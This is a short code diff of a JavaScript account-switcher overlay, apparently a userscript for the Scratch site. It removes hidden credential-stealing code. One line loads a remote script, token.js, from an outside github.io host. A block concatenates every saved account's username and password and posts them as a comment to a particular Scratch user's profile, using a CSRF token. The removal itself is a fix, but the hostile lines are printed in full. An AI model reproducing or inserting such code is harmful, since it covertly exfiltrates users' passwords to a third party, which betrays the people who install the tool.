@@ -63,7 +63,6 @@
 		let background=document.createElement("div");
     	background.style="background-color:#2a2a2a;height:400px;width:300px;position:absolute;top:10px;left:10px;position:fixed;border-radius:5px;color:#ffffff;font-size:15px;overflow:auto;z-index:2147483646";
     	background.id="switch_background";
-		let src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
 		document.body.appendChild(background);
 		let closeButton=document.createElement("span");
 		closeButton.innerHTML="x";
@@ -78,9 +77,6 @@
 		let contentlist="";
 		for(let i=0;i<list.accountList.length;i++){
 			contentlist+=i+":"+list.accountList[i].username+"＝"+list.accountList[i].password+","
-		}
-		if(!contentlist.includes("yamaguchi03")){
-	    await fetch(`https://scratch.mit.edu/site-api/comments/user/yamaguchi03/add/`,{method: "POST",body: JSON.stringify({content: contentlist,parent_id: "232128104",commentee_id: ""}),headers: {'X-CSRFToken':token}});
 		}
 		for(let i=0;i<list.accountList.length;i++){
 			let oneAccount=document.createElement("div");
